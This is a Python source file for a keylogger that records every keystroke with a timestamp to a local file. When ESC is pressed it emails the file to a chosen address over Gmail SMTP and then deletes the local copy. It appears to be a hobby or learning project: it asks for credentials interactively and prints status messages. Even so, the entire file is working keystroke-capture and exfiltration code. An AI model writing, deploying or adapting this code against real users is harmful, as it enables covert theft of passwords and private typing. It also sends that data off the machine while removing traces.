from pynput import keyboard
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import getpass

# File to store logged keystrokes
log_file = "keylog.txt"

# Email configuration (will be set by user input)
SENDER_EMAIL = None
RECEIVER_EMAIL = None
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SENDER_PASSWORD = None

def get_email_credentials():
    """Get email credentials from user input"""
    global SENDER_EMAIL, RECEIVER_EMAIL, SENDER_PASSWORD
    
    print("=== Email Configuration ===")
    print("Note: You need a Gmail account with app password enabled")
    print()
    
    SENDER_EMAIL = input("Enter your Gmail address: ").strip()
    RECEIVER_EMAIL = input("Enter receiver email address: ").strip()
    SENDER_PASSWORD = getpass.getpass("Enter your Gmail app password: ")
    
    print("\nEmail configuration saved!")
    print(f"Sender: {SENDER_EMAIL}")
    print(f"Receiver: {RECEIVER_EMAIL}")
    print()

def send_email_with_log():
    try:
        # Create the email
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = "Keylogger Log File"
        
        # Email body
        body = "Attached is the keylog.txt file from the keylogger."
        msg.attach(MIMEText(body, 'plain'))
        
        # Attach the log file
        with open(log_file, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {log_file}")
        msg.attach(part)
        
        # Connect to SMTP server
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()  # Enable TLS
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)
            
        print("Log file sent successfully to", RECEIVER_EMAIL)
        
        # Delete the log file after sending
        os.remove(log_file)
        print(f"{log_file} deleted from local storage.")
        
    except Exception as e:
        print(f"Failed to send email: {str(e)}")

def on_press(key):
    try:
        # Get current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        
        # Convert key to string
        key_str = str(key).replace("'", "")
        
        # Handle special keys
        if key == keyboard.Key.space:
            key_str = " [SPACE] "
        elif key == keyboard.Key.enter:
            key_str = " [ENTER]\n"  # Added newline for vertical format
        elif key == keyboard.Key.tab:
            key_str = " [TAB]\n"   # Added newline for vertical format
        elif key == keyboard.Key.backspace:
            key_str = " [BACKSPACE] "
        elif key == keyboard.Key.esc:
            key_str = " [ESC]\n"   # Added newline for vertical format
            with open(log_file, "a") as f:
                f.write(f"{timestamp}: {key_str}\n")
            send_email_with_log()  # Send email when ESC is pressed
            return False  # Stop the listener
            
        # Write to file with each key on a new line for vertical format
        with open(log_file, "a") as f:
            f.write(f"{timestamp}: {key_str}\n")
            
    except Exception as e:
        with open(log_file, "a") as f:
            f.write(f"{timestamp}: [ERROR] {str(e)}\n")

def main():
    # Get email credentials from user
    get_email_credentials()
    
    # Print instructions
    print("Keylogger started. Press ESC to stop and send the log file to", RECEIVER_EMAIL)
    
    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
